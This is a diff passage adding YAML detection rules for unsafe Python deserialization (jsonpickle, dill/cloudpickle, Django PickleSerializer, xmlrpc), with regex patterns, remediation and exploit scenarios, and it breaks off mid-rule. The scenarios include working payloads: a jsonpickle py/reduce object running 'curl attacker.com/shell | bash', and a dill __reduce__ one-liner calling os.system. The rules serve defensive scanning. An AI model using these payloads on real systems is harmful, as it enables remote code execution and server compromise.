+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PY-001"
+        - "DESER-PY-006"
+
+  # ============================================================================
+  # DESER-PY-005: jsonpickle Decode
+  # ============================================================================
+  - rule_id: "DESER-PY-005"
+    title: "jsonpickle Decode of Untrusted Data Enabling Object Injection"
+    description: >
+      Detects usage of jsonpickle.decode() or jsonpickle.loads() on data from
+      untrusted sources. jsonpickle embeds Python type information in JSON
+      using a special py/object key, allowing reconstruction of arbitrary
+      Python objects during decoding. Since jsonpickle transparently handles
+      complex Python types including classes with __reduce__, __setstate__,
+      and __getattr__ methods, an attacker can craft a JSON payload that
+      instantiates malicious objects during deserialization, achieving
+      arbitrary code execution.
+    language: python
+    category: deserialization
+    severity: High
+    confidence: 0.93
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - jsonpickle
+      - rce
+      - python
+      - json
+      - object-injection
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'jsonpickle\.(decode|loads)\s*\(\s*(request\.|data|payload|body|content|input|raw|message)'
+        description: "jsonpickle.decode on user-controlled input"
+      - type: regex
+        pattern: 'jsonpickle\.unpickler\.Unpickler\s*\(\s*\)\.restore\s*\('
+        description: "Direct Unpickler.restore call on untrusted data"
+      - type: regex
+        pattern: 'jsonpickle\.(decode|loads)\s*\(\s*(base64\.b64decode|json\.loads)\s*\('
+        description: "jsonpickle.decode on decoded/parsed data"
+      - type: regex
+        pattern: 'jsonpickle\.set_preferred_backend.*jsonpickle\.(decode|loads)\s*\('
+        description: "jsonpickle with custom backend and decode"
+      - type: regex
+        pattern: 'from\s+jsonpickle\s+import\s+(decode|loads)'
+        description: "Direct import of jsonpickle decode function"
+      - type: regex
+        pattern: 'jsonpickle\.(decode|loads)\s*\(\s*(response\.(text|content|json)|urllib|requests\.\w+)'
+        description: "jsonpickle.decode on data from external HTTP response"
+    anti_patterns:
+      - 'jsonpickle\.(decode|loads)\s*\(\s*jsonpickle\.(encode|dumps)\s*\('
+      - 'jsonpickle\.(decode|loads)\s*\(\s*["\x27]'
+      - '#\s*nosec'
+      - '#\s*noqa'
+      - 'jsonpickle\.(decode|loads)\s*\(\s*(fixture|mock|test|sample)'
+      - 'jsonpickle\.(decode|loads)\s*\(\s*internal'
+      - 'jsonpickle\.(decode|loads)\s*\(\s*trusted'
+      - 'jsonpickle\.set_encoder_options.*safe'
+      - 'mock.*jsonpickle'
+      - 'jsonpickle\.(decode|loads)\s*\(\s*self\.'
+      - 'jsonpickle\.(decode|loads)\s*\(\s*config\.'
+      - 'hmac.*jsonpickle'
+      - 'signed.*jsonpickle'
+    bypass_variants:
+      - description: "Using py/reduce key in JSON to invoke arbitrary callables"
+        pattern: '["\x27]py/reduce["\x27]\s*:\s*\{'
+      - description: "Nested py/object embedding to chain object construction"
+        pattern: '["\x27]py/object["\x27]\s*:\s*["\x27](os|subprocess|importlib)\.'
+      - description: "jsonpickle with custom handler classes that are exploitable"
+        pattern: 'jsonpickle\.handlers\.register\s*\('
+    evasion_indicators:
+      - "JSON payload with py/object or py/reduce keys"
+      - "Custom jsonpickle handlers that may introduce unsafe deserialization"
+      - "Base64-encoded JSON with embedded py/object markers"
+      - "Aliased import of jsonpickle"
+    encoding_variants:
+      - type: "base64"
+        pattern: 'jsonpickle\.(decode|loads)\s*\(\s*base64\.(b64decode|decodebytes)\s*\('
+      - type: "url_encoded"
+        pattern: 'jsonpickle\.(decode|loads)\s*\(\s*urllib\.parse\.unquote\s*\('
+      - type: "compressed"
+        pattern: 'jsonpickle\.(decode|loads)\s*\(\s*zlib\.decompress\s*\('
+    multi_function_chain_patterns:
+      - "API request -> JSON parse -> jsonpickle.decode -> object instantiation -> RCE"
+      - "Database read -> jsonpickle.decode -> deserialized object -> method call"
+      - "Message queue -> jsonpickle.decode -> task processing -> code execution"
+      - "Cache get -> jsonpickle.decode -> application state mutation"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "jsonpickle reconstructs arbitrary Python objects from JSON, allowing code execution via __reduce__, __setstate__, or custom unpickle handlers"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request body (JSON)"
+        sink: "jsonpickle.decode"
+        through: "Direct parameter passing"
+      - source: "Database stored JSON value"
+        sink: "jsonpickle.decode"
+        through: "ORM query result"
+      - source: "Message queue JSON message"
+        sink: "jsonpickle.decode"
+        through: "Consumer callback"
+    impact: |
+      jsonpickle deserialization of untrusted data can lead to:
+      - Arbitrary code execution through py/reduce or py/object payloads
+      - Object injection with attacker-controlled class instantiation
+      - Information disclosure through serialized internal state
+      - Privilege escalation via crafted object attribute injection
+      - Server compromise through chained object construction
+    remediation: |
+      1. Never use jsonpickle with untrusted data. Use standard json module:
+         ```python
+         import json
+         data = json.loads(user_input)
+         ```
+      2. If jsonpickle is needed for internal use, validate data source:
+         ```python
+         import hmac
+         import hashlib
+
+         def safe_decode(data, key):
+             payload, signature = data.rsplit('|', 1)
+             expected = hmac.new(key, payload.encode(), hashlib.sha256).hexdigest()
+             if not hmac.compare_digest(signature, expected):
+                 raise ValueError('Invalid signature')
+             return jsonpickle.decode(payload)
+         ```
+      3. Use jsonpickle's safe mode if available (unpicklable=False for encode).
+      4. Replace jsonpickle with pydantic or marshmallow for data serialization.
+      5. Implement input schema validation before jsonpickle.decode.
+    references:
+      - "https://github.com/jsonpickle/jsonpickle"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "jsonpickle import in same file"
+        - "No signature verification before decode"
+        - "User-controlled data flows into jsonpickle.decode"
+        - "py/object or py/reduce keys in input"
+      taint_source_indicators:
+        - "request.data"
+        - "request.json"
+        - "database query result"
+        - "message queue payload"
+        - "API response body"
+      taint_sink_indicators:
+        - "jsonpickle.decode"
+        - "jsonpickle.loads"
+        - "Unpickler.restore"
+      sanitization_patterns:
+        - "HMAC signature verification"
+        - "Input source authentication"
+        - "JSON schema validation filtering py/ keys"
+        - "Allowlist-based type checking"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 - signature_present)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A REST API stores complex Python objects in a PostgreSQL JSON column
+        using jsonpickle.encode(). When retrieving data, it uses
+        jsonpickle.decode() on the stored JSON. An attacker who can write
+        to the database (via SQL injection or direct access) stores a
+        malicious JSON payload:
+        {"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["curl attacker.com/shell | bash"]}]}
+        When the application reads this record and calls jsonpickle.decode(),
+        os.system is invoked with the attacker's command.
+      example_payload: '{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id > /tmp/pwned"]}]}'
+      attacker_objective: "Achieve remote code execution through jsonpickle deserialization of crafted JSON containing py/reduce directives"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PY-001"
+        - "DESER-PY-006"
+
+  # ============================================================================
+  # DESER-PY-006: dill / cloudpickle Untrusted Deserialization
+  # ============================================================================
+  - rule_id: "DESER-PY-006"
+    title: "dill or cloudpickle Deserialization of Untrusted Data"
+    description: >
+      Detects usage of dill or cloudpickle modules for deserializing data
+      from untrusted sources. Both dill and cloudpickle extend Python's
+      pickle module to support serialization of a broader range of Python
+      objects including lambda functions, closures, nested functions, and
+      dynamically created classes. These extended capabilities make them
+      even more dangerous than standard pickle when processing untrusted
+      data, as they can serialize and deserialize virtually any Python
+      object including arbitrary code.
+    language: python
+    category: deserialization
+    severity: High
+    confidence: 0.94
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - dill
+      - cloudpickle
+      - rce
+      - python
+      - critical
+      - extended-pickle
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'dill\.(loads?|Unpickler)\s*\(\s*(request\.|data|payload|body|content|input|raw|message)'
+        description: "dill.loads/load on user-controlled input"
+      - type: regex
+        pattern: 'cloudpickle\.(loads?|Unpickler)\s*\(\s*(request\.|data|payload|body|content|input|raw|message)'
+        description: "cloudpickle.loads/load on user-controlled input"
+      - type: regex
+        pattern: '(dill|cloudpickle)\.loads?\s*\(\s*(base64\.b64decode|binascii\.unhexlify)\s*\('
+        description: "dill/cloudpickle on decoded data"
+      - type: regex
+        pattern: '(dill|cloudpickle)\.loads?\s*\(\s*socket\.\w*recv'
+        description: "dill/cloudpickle on network socket data"
+      - type: regex
+        pattern: '(dill|cloudpickle)\.loads?\s*\(\s*(redis|cache|memcache)\.(get|hget)\s*\('
+        description: "dill/cloudpickle on data from cache/queue store"
+      - type: regex
+        pattern: 'from\s+(dill|cloudpickle)\s+import\s+(loads?|Unpickler)'
+        description: "Direct import of dill/cloudpickle deserialization functions"
+      - type: regex
+        pattern: '(dill|cloudpickle)\.loads?\s*\(\s*open\s*\(\s*(request\.|user|upload|temp|tmp)'
+        description: "dill/cloudpickle on file from user-controlled path"
+    anti_patterns:
+      - '(dill|cloudpickle)\.loads?\s*\(\s*(dill|cloudpickle)\.dumps?\s*\('
+      - '(dill|cloudpickle)\.loads?\s*\(\s*["\x27]'
+      - '#\s*nosec'
+      - '#\s*noqa'
+      - '(dill|cloudpickle)\.loads?\s*\(\s*(fixture|mock|test|sample)'
+      - '(dill|cloudpickle)\.loads?\s*\(\s*internal'
+      - '(dill|cloudpickle)\.loads?\s*\(\s*trusted'
+      - '(dill|cloudpickle)\.loads?\s*\(\s*self\.'
+      - 'mock.*(dill|cloudpickle)'
+      - '(dill|cloudpickle)\.loads?\s*\(\s*signed'
+      - 'hmac.*(dill|cloudpickle)'
+      - '(dill|cloudpickle)\.loads?\s*\(\s*config\.'
+      - '(dill|cloudpickle)\.loads?\s*\(\s*Path\s*\('
+    bypass_variants:
+      - description: "dill with session saving allowing arbitrary module imports"
+        pattern: 'dill\.load_session\s*\(\s*(request\.|data|path|filename|upload)'
+      - description: "cloudpickle with custom dispatch table"
+        pattern: 'cloudpickle\.CloudPickler.*dispatch_table'
+      - description: "Dynamic import aliasing of dill/cloudpickle"
+        pattern: '__import__\s*\(\s*["\x27](dill|cloudpickle)["\x27]\s*\)\.loads\s*\('
+    evasion_indicators:
+      - "Dynamic import of dill or cloudpickle module"
+      - "Base64 or hex-encoded dill payload"
+      - "Session file loading from untrusted source (dill.load_session)"
+      - "Aliased module import"
+      - "Lambda or closure serialization from untrusted source"
+    encoding_variants:
+      - type: "base64"
+        pattern: '(dill|cloudpickle)\.loads?\s*\(\s*base64\.(b64decode|decodebytes)\s*\('
+      - type: "hex"
+        pattern: '(dill|cloudpickle)\.loads?\s*\(\s*(bytes\.fromhex|binascii\.unhexlify)\s*\('
+      - type: "compressed"
+        pattern: '(dill|cloudpickle)\.loads?\s*\(\s*zlib\.decompress\s*\('
+    multi_function_chain_patterns:
+      - "Spark job -> cloudpickle.loads -> UDF execution -> RCE"
+      - "ML pipeline -> dill.loads -> model loading -> code execution"
+      - "Distributed task -> cloudpickle.loads -> function reconstruction -> execution"
+      - "API endpoint -> dill.loads -> lambda reconstruction -> invocation"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "dill and cloudpickle serialize lambdas, closures, and dynamic classes, making them even more exploitable than standard pickle for RCE"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request / file upload"
+        sink: "dill.loads / cloudpickle.loads"
+        through: "Direct or base64-decoded parameter"
+      - source: "Distributed computing task payload"
+        sink: "cloudpickle.loads"
+        through: "Task queue deserialization"
+      - source: "ML model file from untrusted source"
+        sink: "dill.load"
+        through: "File open and read"
+    impact: |
+      dill/cloudpickle deserialization of untrusted data leads to:
+      - Full remote code execution including lambda/closure reconstruction
+      - Arbitrary module import and function execution
+      - Complete server compromise
+      - Data exfiltration from ML pipelines and compute environments
+      - Lateral movement in distributed computing clusters
+      - Supply chain attacks through malicious serialized functions
+    remediation: |
+      1. Never deserialize dill/cloudpickle data from untrusted sources:
+         ```python
+         # Bad: deserializing user input
+         func = dill.loads(request.data)
+
+         # Good: use safe alternatives
+         import json
+         config = json.loads(request.data)
+         ```
+      2. For ML model serialization, use safe formats:
+         ```python
+         # Use ONNX, SavedModel, or safetensors instead
+         import safetensors
+         model = safetensors.torch.load_file('model.safetensors')
+         ```
+      3. Sign serialized functions with HMAC before transmission.
+      4. Use process sandboxing for untrusted code execution (gVisor, Firecracker).
+      5. Validate data source authenticity before deserialization.
+    references:
+      - "https://github.com/uqfoundation/dill"
+      - "https://github.com/cloudpipe/cloudpickle"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "dill or cloudpickle import in same file"
+        - "User-controlled data flows into loads/load"
+        - "No signature verification before deserialization"
+        - "ML or distributed computing context"
+      taint_source_indicators:
+        - "request.data"
+        - "request.files"
+        - "distributed task payload"
+        - "model file from external source"
+        - "socket.recv"
+      taint_sink_indicators:
+        - "dill.loads"
+        - "dill.load"
+        - "cloudpickle.loads"
+        - "cloudpickle.load"
+        - "dill.load_session"
+      sanitization_patterns:
+        - "HMAC verification before deserialization"
+        - "Source authentication"
+        - "Process sandboxing"
+        - "Allowlisted function registry"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 - source_authentication_present)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A machine learning platform allows users to upload serialized model
+        objects. The backend uses dill.load to deserialize uploaded model
+        files for inference. An attacker uploads a crafted dill-serialized
+        file containing a class with a __reduce__ method that executes
+        os.system. When the platform loads the model for inference,
+        dill.load triggers the __reduce__ method, executing the attacker's
+        reverse shell command on the ML infrastructure, potentially gaining
+        access to GPU resources and training data.
+      example_payload: "dill.dumps(type('Exploit', (), {'__reduce__': lambda self: (os.system, ('id',))})())"
+      attacker_objective: "Execute arbitrary code on ML infrastructure through malicious serialized model objects"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PY-001"
+        - "DESER-PY-004"
+        - "DESER-PY-005"
+
+  # ============================================================================
+  # DESER-PY-007: Django Session Deserialization (PickleSerializer)
+  # ============================================================================
+  - rule_id: "DESER-PY-007"
+    title: "Django Session Deserialization Using PickleSerializer"
+    description: >
+      Detects Django applications configured to use PickleSerializer for
+      session serialization. Django's session framework can use different
+      serializers for storing session data. When PickleSerializer is
+      configured (SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'),
+      session data is stored using pickle. If an attacker can forge session
+      cookies (via secret key leakage, session fixation, or cookie tampering),
+      they can inject pickle payloads that execute arbitrary code when the
+      session is loaded on the server side.
+    language: python
+    category: deserialization
+    severity: Critical
+    confidence: 0.91
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - django
+      - session
+      - pickle
+      - python
+      - framework
+      - cookie
+      - critical
+    detection_layer: 2
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'SESSION_SERIALIZER\s*=\s*["\x27]django\.contrib\.sessions\.serializers\.PickleSerializer["\x27]'
+        description: "Django SESSION_SERIALIZER set to PickleSerializer"
+      - type: regex
+        pattern: 'from\s+django\.contrib\.sessions\.serializers\s+import\s+PickleSerializer'
+        description: "Import of Django PickleSerializer"
+      - type: regex
+        pattern: 'PickleSerializer\s*\(\s*\)'
+        description: "PickleSerializer instantiation"
+      - type: regex
+        pattern: 'session_serializer\s*=\s*["\x27].*PickleSerializer["\x27]'
+        description: "Session serializer configuration referencing PickleSerializer"
+      - type: regex
+        pattern: 'pickle\.(loads?|dumps?)\s*\(\s*.*session'
+        description: "Direct pickle usage with session data"
+      - type: regex
+        pattern: 'SESSION_ENGINE\s*=\s*["\x27]django\.contrib\.sessions\.backends\.(cache|file|db)["\x27].*PickleSerializer'
+        description: "Session engine combined with PickleSerializer"
+    anti_patterns:
+      - 'SESSION_SERIALIZER\s*=\s*["\x27]django\.contrib\.sessions\.serializers\.JSONSerializer["\x27]'
+      - 'SESSION_SERIALIZER.*JSONSerializer'
+      - '#\s*deprecated.*PickleSerializer'
+      - '#\s*TODO.*remove.*PickleSerializer'
+      - '#\s*FIXME.*PickleSerializer'
+      - '\/\/\s*test'
+      - 'mock.*PickleSerializer'
+      - 'SESSION_COOKIE_HTTPONLY\s*=\s*True.*SESSION_COOKIE_SECURE\s*=\s*True'
+      - 'SESSION_SERIALIZER.*#.*disabled'
+      - 'SESSION_SERIALIZER.*#.*commented'
+      - '#.*SESSION_SERIALIZER.*PickleSerializer'
+    bypass_variants:
+      - description: "Custom session serializer extending PickleSerializer"
+        pattern: 'class\s+\w+Serializer\s*\(\s*PickleSerializer\s*\)'
+      - description: "SECRET_KEY exposure enabling session cookie forgery"
+        pattern: 'SECRET_KEY\s*=\s*["\x27][^"]{,20}["\x27]|SECRET_KEY\s*=\s*os\.environ'
+      - description: "Session cookie with inadequate signing (weak secret)"
+        pattern: 'SESSION_COOKIE_SECURE\s*=\s*False|SESSION_COOKIE_HTTPONLY\s*=\s*False'
+    evasion_indicators:
+      - "Custom serializer class inheriting from PickleSerializer"
+      - "Weak SECRET_KEY enabling session forgery"
+      - "Session stored in client-side cookie (signed-cookies backend)"
+      - "Debug mode exposing SECRET_KEY"
+      - "Environment variable leak of SECRET_KEY"
+    encoding_variants:
+      - type: "signed_cookie"
+        pattern: 'SESSION_ENGINE\s*=\s*["\x27]django\.contrib\.sessions\.backends\.signed_cookies["\x27]'
+      - type: "base64_session"
+        pattern: 'base64\.(b64decode|decodebytes)\s*\(\s*session'
+      - type: "compressed_session"
+        pattern: 'zlib\.decompress\s*\(\s*session'
+    multi_function_chain_patterns:
+      - "SECRET_KEY leak -> session cookie forge -> PickleSerializer -> RCE"
+      - "XSS -> session cookie theft -> modify -> pickle injection"
+      - "Debug page -> SECRET_KEY exposure -> session forgery -> code execution"
+      - "Session fixation -> pickle payload injection -> server-side execution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Forged session cookies with pickle payloads execute arbitrary code when the Django server loads the session, providing full server access"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP session cookie"
+        sink: "Django session deserialization (PickleSerializer)"
+        through: "Session middleware"
+      - source: "Forged session data"
+        sink: "pickle.loads in PickleSerializer"
+        through: "Django session framework"
+      - source: "Cache stored session"
+        sink: "PickleSerializer.loads"
+        through: "Session backend get"
+    impact: |
+      Django PickleSerializer usage can lead to:
+      - Remote Code Execution through forged session cookies
+      - Complete server compromise via pickle deserialization
+      - Privilege escalation from any authenticated user to superuser
+      - Data exfiltration from the Django application database
+      - Persistent backdoor via modified session data
+      - Compliance violations (PCI DSS, GDPR)
+    remediation: |
+      1. Switch to JSONSerializer (Django default since 1.6):
+         ```python
+         # settings.py
+         SESSION_SERIALIZER = 'django.contrib.sessions.serializers.JSONSerializer'
+         ```
+      2. Ensure SECRET_KEY is strong and not exposed:
+         ```python
+         import secrets
+         SECRET_KEY = secrets.token_hex(50)
+         ```
+      3. Enable secure session cookie flags:
+         ```python
+         SESSION_COOKIE_HTTPONLY = True
+         SESSION_COOKIE_SECURE = True
+         SESSION_COOKIE_SAMESITE = 'Lax'
+         ```
+      4. Use server-side session storage (database or cache) instead of signed cookies.
+      5. Rotate SECRET_KEY periodically and after any suspected exposure.
+    references:
+      - "https://docs.djangoproject.com/en/4.2/topics/http/sessions/#session-serialization"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "Django settings file with SESSION_SERIALIZER"
+        - "PickleSerializer import or reference"
+        - "Weak or exposed SECRET_KEY in same settings"
+        - "Session cookie-based backend configuration"
+      taint_source_indicators:
+        - "HTTP session cookie"
+        - "Session ID in URL"
+        - "Forged session token"
+        - "Cache-stored session data"
+      taint_sink_indicators:
+        - "PickleSerializer.loads"
+        - "pickle.loads in session backend"
+        - "Session deserialization"
+      sanitization_patterns:
+        - "JSONSerializer configured"
+        - "Strong SECRET_KEY (64+ characters)"
+        - "Session cookie security flags enabled"
+        - "Server-side session storage"
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (secret_key_weak ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Django application uses PickleSerializer for sessions and stores
+        sessions in signed cookies. The SECRET_KEY is accidentally committed
+        to a public Git repository. An attacker finds the key, crafts a
+        pickle payload that executes a reverse shell, signs it as a valid
+        Django session cookie using the leaked SECRET_KEY, and sends a
+        request with the forged session cookie. The Django session middleware
+        deserializes the cookie using pickle, executing the attacker's code
+        on every request.
+      example_payload: "django.core.signing.dumps(exploit_pickle_obj, key=leaked_secret_key, salt='django.contrib.sessions.backends.signed_cookies')"
+      attacker_objective: "Forge Django session cookies with pickle RCE payloads to execute code on the server"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PY-001"
+        - "DESER-PY-005"
+
+  # ============================================================================
+  # DESER-PY-008: XML Deserialization via xmlrpc
+  # ============================================================================
+  - rule_id: "DESER-PY-008"
+    title: "XML Deserialization via xmlrpc Enabling SSRF and Data Exfiltration"
+    description: >
+      Detects usage of Python's xmlrpc.server or xmlrpc.client modules with
+      untrusted data, as well as unsafe XML parsing that can lead to XML
+      External Entity (XXE) injection, Server-Side Request Forgery (SSRF),
+      and in some cases deserialization attacks. The xmlrpc protocol
+      serializes Python objects as XML, and processing untrusted XML-RPC
+      requests or responses can lead to entity expansion attacks (billion
+      laughs), external entity loading (XXE/SSRF), and object injection
+      through crafted XML type tags.
+    language: python
+    category: deserialization
+    severity: High
+    confidence: 0.87
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - xmlrpc
+      - xxe
+      - ssrf
+      - python
+      - xml
+      - entity-injection
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'xmlrpc\.server\.SimpleXMLRPCServer\s*\('
+        description: "SimpleXMLRPCServer exposing XML-RPC methods"
+      - type: regex
+        pattern: 'xmlrpc\.client\.ServerProxy\s*\(\s*(request\.|data|url|user_input|payload)'
+        description: "XML-RPC client connecting to user-controlled URL (SSRF)"
+      - type: regex
+        pattern: 'xmlrpc\.client\.loads\s*\(\s*(request\.|data|payload|body|content|xml_data)'
+        description: "xmlrpc.client.loads parsing untrusted XML data"
+      - type: regex
+        pattern: 'SimpleXMLRPCServer.*register_function\s*\(\s*lambda'
+        description: "Registering lambda functions in XML-RPC server"
+      - type: regex
+        pattern: 'xmlrpc\.client\.ServerProxy\s*\([^)]*allow_none\s*=\s*True'
+        description: "XML-RPC client with extended type support"
+      - type: regex
+        pattern: 'register_instance\s*\(\s*\w+\s*,\s*allow_dotted_names\s*=\s*True'
+        description: "XML-RPC server allowing dotted name access (method traversal)"
+      - type: regex
+        pattern: 'from\s+xmlrpc\.(server|client)\s+import'
+        description: "Import of xmlrpc module components"
+      - type: regex
+        pattern: 'xmlrpc\.client\.Unmarshaller\s*\('
+        description: "Direct Unmarshaller instantiation for XML-RPC parsing"
+    anti_patterns:
+      - 'xmlrpc\.server.*localhost|xmlrpc\.server.*127\.0\.0\.1'
+      - 'xmlrpc\.client\.ServerProxy\s*\(\s*["\x27]http://localhost'
+      - 'xmlrpc\.client\.ServerProxy\s*\(\s*["\x27]http://127\.0\.0\.1'
+      - '#\s*nosec'
+      - '#\s*noqa'
+      - '\/\/\s*test'
+      - 'mock.*xmlrpc'
+      - 'defusedxml.*xmlrpc'
+      - 'xmlrpc.*firewall'
+      - 'xmlrpc.*internal_network'
+      - 'allow_dotted_names\s*=\s*False'
+      - 'register_introspection_functions\s*\(\s*\).*#.*disabled'
+      - 'xmlrpc.*trusted'
+    bypass_variants:
+      - description: "XXE via crafted XML-RPC request with external entity"
+        pattern: '<!DOCTYPE\s+\w+\s+\[\s*<!ENTITY'
+      - description: "Billion laughs DoS via XML entity expansion"
+        pattern: '<!ENTITY\s+\w+\s+["\x27](&\w+;){2,}["\x27]'
+      - description: "SSRF via xmlrpc.client connecting to internal services"
+        pattern: 'xmlrpc\.client\.ServerProxy\s*\(\s*(f["\x27]|["\x27]\s*\+|format\s*\(|%\s*\()'
+    evasion_indicators:
+      - "XML-RPC request with DTD containing external entities"
+      - "Entity expansion attack in XML-RPC payload"
+      - "SSRF through ServerProxy URL parameter"
+      - "Method traversal via dotted name access"
+      - "Custom XML parser without entity restriction"
+    encoding_variants:
+      - type: "utf16_xml"
+        pattern: '(encoding\s*=\s*["\x27]utf-16["\x27]|\\xfe\\xff)'
+      - type: "base64_value"
+        pattern: '<base64>[^<]*</base64>'
+      - type: "encoded_entity"
+        pattern: '&#x[0-9a-fA-F]+;|&#\d+;'
+    multi_function_chain_patterns:
+      - "External XML-RPC request -> xmlrpc.server -> registered method -> system access"
+      - "User URL -> xmlrpc.client.ServerProxy -> SSRF to internal services"
+      - "XML upload -> xmlrpc.client.loads -> XXE/entity expansion"
+      - "Config URL -> ServerProxy -> method call -> data exfiltration"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "XML-RPC servers with allow_dotted_names=True expose object traversal, and XXE in XML-RPC requests can access internal files and services"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP POST body (XML-RPC request)"
+        sink: "SimpleXMLRPCServer request handler"
+        through: "XML parsing"
+      - source: "User-provided URL"
+        sink: "xmlrpc.client.ServerProxy"
+        through: "URL parameter"
+      - source: "XML file upload"
+        sink: "xmlrpc.client.loads"
+        through: "File read and parse"
+    impact: |
+      XML-RPC deserialization vulnerabilities can lead to:
+      - Server-Side Request Forgery through ServerProxy URL manipulation
+      - XML External Entity (XXE) injection for file disclosure
+      - Denial of Service via billion laughs entity expansion
+      - Information disclosure through XML error messages
+      - Method traversal on registered instances (allow_dotted_names)
+      - SSRF to internal services bypassing network segmentation
+    remediation: |
+      1. Use defusedxml for XML parsing in XML-RPC:
+         ```python
+         import defusedxml.xmlrpc
+         defusedxml.xmlrpc.monkey_patch()
+         ```
+      2. Disable dotted name access on registered instances:
+         ```python
+         server.register_instance(handler, allow_dotted_names=False)
+         ```
+      3. Validate and restrict XML-RPC client URLs:
+         ```python
+         from urllib.parse import urlparse
+         url = urlparse(user_url)
+         if url.hostname not in ALLOWED_HOSTS:
+             raise ValueError('Disallowed host')
+         proxy = xmlrpc.client.ServerProxy(user_url)
+         ```
+      4. Implement request size limits for XML-RPC servers.
+      5. Use gRPC or REST/JSON APIs instead of XML-RPC for new services.
+    references:
+      - "https://docs.python.org/3/library/xmlrpc.html"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://cwe.mitre.org/data/definitions/611.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://github.com/tiran/defusedxml"
+    context_awareness:
+      surrounding_context_patterns:
+        - "xmlrpc import in same file"
+        - "SimpleXMLRPCServer bound to 0.0.0.0 or public interface"
+        - "User-controlled URL in ServerProxy call"
+        - "No defusedxml monkey patching"
+      taint_source_indicators:
+        - "HTTP POST body"
+        - "User-provided URL string"
+        - "XML file content"
+        - "Form input"
+        - "API parameter"
+      taint_sink_indicators:
+        - "SimpleXMLRPCServer"
+        - "xmlrpc.client.ServerProxy"
+        - "xmlrpc.client.loads"
+        - "Unmarshaller"
+      sanitization_patterns:
+        - "defusedxml.xmlrpc.monkey_patch()"
+        - "URL validation and allowlist"
+        - "allow_dotted_names=False"
+        - "XML input size limits"
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (public_facing ? 1.3 : 0.9)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A legacy application exposes an XML-RPC endpoint for third-party
+        integrations. The server uses allow_dotted_names=True on the
